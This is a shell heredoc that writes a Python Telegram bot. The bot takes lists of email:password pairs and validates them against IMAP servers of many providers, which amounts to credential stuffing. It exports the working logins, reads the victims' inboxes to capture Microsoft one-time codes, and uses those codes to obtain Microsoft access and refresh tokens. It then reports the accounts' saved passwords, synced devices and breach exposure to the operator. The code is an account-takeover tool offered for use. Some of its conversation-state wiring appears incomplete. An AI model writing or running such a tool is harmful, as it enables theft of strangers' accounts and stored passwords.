cat > /opt/microsoft_auth_bot/bot.py << 'PYEOF'
import json
import os
import asyncio
from telegram import Update, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, ConversationHandler
from config import TELEGRAM_BOT_TOKEN, VALIDATED_FILE, IMAP_MAP, DEFAULT_IMAP_SERVER
from imap_validator import IMAPValidator
from otp_extractor import OTPExtractor
from microsoft_auth import MicrosoftAuthenticator
from password_monitor import MicrosoftPasswordMonitor

WAITING_FILE, VALIDATING, EXPORTING, FETCHING_OTP, AUTHENTICATING, CHECKING_PASSWORDS, REPORTING, DONE = range(8)
validator = IMAPValidator()
auth = MicrosoftAuthenticator()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Microsoft IMAP Authenticator Bot\n\nSend me a file containing email:password pairs (one per line).\nFormat: email@domain.com:password\n\nSupported providers: Gmail, Yahoo, Outlook, iCloud, AT&T, Verizon, Comcast, Spectrum, Cox, Frontier, CenturyLink, Windstream, T-Mobile, Zoho, GMX, Mail.com, FastMail, ProtonMail, Optimum, and 150+ ISPs.\n\nThe bot will:\n1. Auto-detect email provider and connect to correct IMAP server\n2. Validate each credential against IMAP\n3. Check for OTP email capability\n4. Export valid credentials\n5. Extract OTP and authenticate with Microsoft\n6. Check saved passwords and sync status\n7. Report live back to you\n\nSend the file now:", reply_markup=ReplyKeyboardRemove())
    return WAITING_FILE

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = update.message.document
    if file.file_name and not file.file_name.endswith(('.txt', '.csv', '.json')):
        await update.message.reply_text("Please send a .txt, .csv, or .json file.")
        return WAITING_FILE
    file_path = await download_file(context, file)
    credentials = parse_credentials(file_path)
    if not credentials:
        await update.message.reply_text("No valid email:password pairs found.\nExpected format: email@domain.com:password (one per line)")
        return WAITING_FILE
    providers = []
    for cred in credentials:
        domain = cred["email"].split("@")[-1].lower()
        if domain in IMAP_MAP:
            providers.append(f"{domain} -> {IMAP_MAP[domain]['server']}")
        else:
            providers.append(f"{domain} -> {DEFAULT_IMAP_SERVER} (default)")
    provider_text = "\n".join(f"  • {p}" for p in providers[:10])
    if len(providers) > 10:
        provider_text += f"\n  ... and {len(providers) - 10} more"
    await update.message.reply_text(f"Received {len(credentials)} credential(s).\nDetected providers:\n{provider_text}\n\nStarting validation...")
    context.user_data["credentials"] = credentials
    context.user_data["file_path"] = file_path
    context.user_data["validated"] = []
    return VALIDATING

async def download_file(context, file):
    file_id = file.file_id
    file_obj = await context.bot.get_file(file_id)
    file_path = f"uploads/{file_obj.file_name}"
    os.makedirs("uploads", exist_ok=True)
    await file_obj.download_to_drive(file_path)
    return file_path

def parse_credentials(file_path):
    credentials = []
    with open(file_path, "r") as f:
        lines = f.readlines()
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if ":" in line:
            parts = line.split(":", 1)
            email_addr = parts[0].strip()
            password = parts[1].strip()
            if "@" in email_addr and password:
                credentials.append({"email": email_addr, "password": password})
    return credentials

async def validate_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE):
    credentials = context.user_data["credentials"]
    total = len(credentials)
    status_msg = await update.message.reply_text(f"Validating {total} credential(s) across {len(IMAP_MAP)}+ ISP servers...\n\n0/{total} complete")
    validated = []
    for i, cred in enumerate(credentials, 1):
        result = validator.validate_imap_login(cred["email"], cred["password"])
        if result["imap_login"]:
            validated.append(cred)
            status_label = "VALID"
        else:
            status_label = "FAILED"
        server_info = result.get("imap_server", DEFAULT_IMAP_SERVER)
        progress_text = f"Validation Progress: {i}/{total} complete\n\nValid: {len(validated)} | Failed: {i - len(validated)}\n\nServer: {server_info}\nCurrent: {cred['email']} -> {status_label}"
        await status_msg.edit_text(progress_text)
        await asyncio.sleep(1)
    context.user_data["validated"] = validated
    await export_validated(update, context)
    if not validated:
        await update.message.reply_text("No valid credentials found. All IMAP logins failed.\n\nPossible causes:\nIncorrect password\n2FA enabled without App Password\nIMAP not enabled in account settings\nAccount locked or suspended")
        return ConversationHandler.END
    await update.message.reply_text(f"{len(validated)} credential(s) validated and exported.\nNow checking for OTP emails...")
    return FETCHING_OTP

async def export_validated(update: Update, context: ContextTypes.DEFAULT_TYPE):
    validated = context.user_data["validated"]
    export_data = {"exported_at": str(__import__("datetime").datetime.utcnow()), "total_validated": len(validated), "credentials": validated, "imap_servers_used": {cred["email"]: validator.get_imap_server(cred["email"]) for cred in validated}}
    with open(VALIDATED_FILE, "w") as f:
        json.dump(export_data, f, indent=2)
    if os.path.exists(VALIDATED_FILE):
        await context.bot.send_document(chat_id=update.effective_chat.id, document=VALIDATED_FILE, caption=f"Exported {len(validated)} validated credential(s)")

async def fetch_otp_and_auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    validated = context.user_data["validated"]
    if not validated:
        await update.message.reply_text("No validated credentials available.")
        return ConversationHandler.END
    first_cred = validated[0]
    email_addr = first_cred["email"]
    password = first_cred["password"]
    server, port = validator.get_imap_server(email_addr)
    await update.message.reply_text(f"Connecting to {server}:{port} for {email_addr}...\nMonitoring inbox for Microsoft OTP email.\nThis may take up to 2 minutes.")
    otp_extractor = OTPExtractor()
    try:
        otp_extractor.connect(email_addr, password)
        otp = otp_extractor.fetch_otp(email_addr, max_age_minutes=10, poll_interval=15, max_attempts=8)
        otp_extractor.disconnect()
    except Exception as e:
        await update.message.reply_text(f"IMAP connection error: {e}")
        return ConversationHandler.END
    if not otp:
        await update.message.reply_text("No OTP found in inbox.\nPlease send the OTP code as a number to the bot.")
        context.user_data["waiting_for_otp"] = True
        return FETCHING_OTP
    context.user_data["otp"] = otp
    context.user_data["auth_email"] = email_addr
    context.user_data["auth_password"] = password
    await update.message.reply_text(f"OTP received: {otp}\nAuthenticating with Microsoft...")
    return AUTHENTICATING

async def authenticate_with_microsoft(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email_addr = context.user_data["auth_email"]
    password = context.user_data["auth_password"]
    otp = context.user_data.get("otp")
    if not otp and update.message.text and update.message.text.isdigit():
        otp = update.message.text.strip()
    if not otp:
        await update.message.reply_text("Please send the OTP code as a number.")
        return FETCHING_OTP
    result = auth.authenticate(email_addr, password, otp)
    if result:
        user_data = auth.get_graph_data(result["access_token"])
        context.user_data["access_token"] = result["access_token"]
        context.user_data["refresh_token"] = result.get("refresh_token")
        context.user_data["user_profile"] = user_data
        await update.message.reply_text("Microsoft authentication successful!\n\nNow checking saved passwords and sync status...")
        return CHECKING_PASSWORDS
    else:
        await update.message.reply_text("Authentication failed.\nThe OTP may be expired or incorrect.\n\nPlease send a new OTP code to try again.")
        return FETCHING_OTP

async def check_saved_passwords(update: Update, context: ContextTypes.DEFAULT_TYPE):
    validated = context.user_data["validated"]
    access_token = context.user_data["access_token"]
    monitor = MicrosoftPasswordMonitor(access_token)
    total = len(validated)
    report_msg = await update.message.reply_text(f"Checking saved passwords across {total} account(s)...\n\n0/{total} checked")
    full_report = {"accounts_checked": [], "timestamp": str(__import__("datetime").datetime.utcnow())}
    for i, cred in enumerate(validated, 1):
        email_addr = cred["email"]
        report = monitor.full_password_report()
        report["account"] = email_addr
        full_report["accounts_checked"].append(report)
        progress_text = f"Password Check Progress: {i}/{total} complete\n\nChecked: {i}\nRemaining: {total - i}\n\nCurrent: {email_addr}\n   Saved Passwords: {report['summary']['total_saved_passwords']}\n   Autofill: {report['summary']['autofill_status']}\n   Devices: {report['summary']['device_count']}\n   Breach Exposure: {len(report['summary']['breach_exposure'])} items"
        await report_msg.edit_text(progress_text)
        await asyncio.sleep(1)
    context.user_data["password_report"] = full_report
    with open("password_report.json", "w") as f:
        json.dump(full_report, f, indent=2)
    await context.bot.send_document(chat_id=update.effective_chat.id, document="password_report.json", caption="Full password report saved to password_report.json")
    return REPORTING

async def report_live(update: Update, context: ContextTypes.DEFAULT_TYPE):
    full_report = context.user_data.get("password_report", {})
    validated = context.user_data.get("validated", [])
    summary_text = f"LIVE PASSWORD REPORT\n\nAccounts Checked: {len(validated)}\nTimestamp: {full_report.get('timestamp', 'N/A')}\n\n"
    for account in full_report.get("accounts_checked", []):
        email = account.get("account", "Unknown")
        summary_text += f"--- {email} ---\n"
        summary_data = account.get("summary", {})
        summary_text += f"  Saved Passwords: {summary_data.get('total_saved_passwords', 0)}\n  Autofill: {summary_data.get('autofill_status', 'Unknown')}\n  Devices Synced: {summary_data.get('device_count', 0)}\n  Breach Exposure: {len(summary_data.get('breach_exposure', []))} items\n\n"
    all_breaches = []
    for account in full_report.get("accounts_checked", []):
        breaches = account.get("summary", {}).get("breach_exposure", [])
        if breaches:
            all_breaches.extend(breaches)
    if all_breaches:
        summary_text += "BREACH EXPOSURE DETECTED\n\n"
        for breach in all_breaches[:10]:
            summary_text += f"  {breach.get('name', 'Unknown')} — {breach.get('date', 'Unknown')}\n"
        if len(all_breaches) > 10:
            summary_text += f"  ... and {len(all_breaches) - 10} more\n"
    await update.message.reply_text(summary_text)
    if os.path.exists("password_report.json"):
        await context.bot.send_document(chat_id=update.effective_chat.id, document="password_report.json", caption="Full detailed report")
    return DONE

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Operation cancelled.\nNo data was saved. Send /start to begin again.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

async def handle_manual_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.isdigit() and len(text) >= 4:
        context.user_data["otp"] = text
        context.user_data["waiting_for_otp"] = False
        return AUTHENTICATING
    return FETCHING_OTP

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAITING_FILE: [MessageHandler(lambda update: update.message.document is not None, handle_file)],
            VALIDATING: [MessageHandler(lambda update: update.message.text and "cancel" in update.message.text.lower(), cancel)],
            EXPORTING: [],
            FETCHING_OTP: [MessageHandler(lambda update: update.message.text and update.message.text.isdigit(), handle_manual_otp), MessageHandler(lambda update: update.message.document is not None, handle_file)],
            AUTHENTICATING: [],
            CHECKING_PASSWORDS: [],
            REPORTING: [],
            DONE: [CommandHandler("start", start)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    application.add_handler(conv_handler)
    print("[+] Telegram bot started. Waiting for messages...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
PYEOF
